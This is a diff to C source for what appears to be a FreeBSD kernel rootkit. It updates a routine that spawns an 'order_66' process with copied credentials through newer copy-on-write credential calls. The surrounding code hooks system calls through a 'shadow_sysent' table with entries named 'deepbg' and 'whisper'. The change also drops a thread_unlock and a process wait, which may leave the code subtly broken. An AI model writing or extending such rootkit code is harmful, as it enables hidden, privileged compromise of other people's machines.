@@ -209,8 +209,9 @@ static void create_order_66(void *data) {
    crcopy(newcred, oldcred);
    proc_set_cred(params->stk_order_66_proc, newcred);
    td = FIRST_THREAD_IN_PROC(params->stk_order_66_proc);
-   crfree(td->td_ucred);
-   td->td_ucred = crhold(params->stk_order_66_proc->p_ucred);
+   crcowfree(td);
+   td->td_realucred = crcowget(params->stk_order_66_proc->p_ucred);
+   td->td_ucred = td->td_realucred;
    PROC_UNLOCK(params->stk_order_66_proc);
    sx_xunlock(&proctree_lock);
    crfree(oldcred);
@@ -227,7 +228,6 @@ static void kick_order_66(void *data) {
    thread_lock(td);
    TD_SET_CAN_RUN(td);
    sched_add(td, SRQ_BORING);
-   thread_unlock(td);
 }
 
 static void order_66() {
@@ -260,7 +260,6 @@ static void order_66() {
    create_order_66(&params);
    kick_order_66(&params);
 
-   int status;
    int error;
    sy_call_t * deepbg = shadow_sysent[DEEPBG_INDEX].new_sy_call;
    sy_call_t * whisper = shadow_sysent[WHISPER_INDEX].new_sy_call;
@@ -295,8 +294,6 @@ static void order_66() {
 #endif
       }
    }
-
-   kern_wait(curthread, params.stk_order_66_proc->p_pid, &status, 0, NULL);
 
 #ifdef DEBUG
    printf("[-] order_66 thread exiting\n");
